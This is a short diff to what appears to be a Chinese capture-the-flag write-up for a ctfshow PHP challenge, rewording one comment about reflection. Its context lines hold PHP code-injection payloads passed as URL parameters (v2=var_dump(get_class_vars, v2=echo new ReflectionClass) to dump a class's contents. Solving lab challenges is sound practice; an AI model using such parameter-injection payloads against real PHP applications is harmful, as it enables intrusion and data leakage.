@@ -62,7 +62,7 @@ if($v0){
 var_dump(get_class_vars('ctfshow'));
 ?v1=1&v2=var_dump(get_class_vars&v3=);
 
-要读取一个实例的类信息，反射实例名
+反射获取类信息
 echo new ReflectionClass('ctfshow')；
 ?v1=1&v2=echo new ReflectionClass&v3=;
 ```
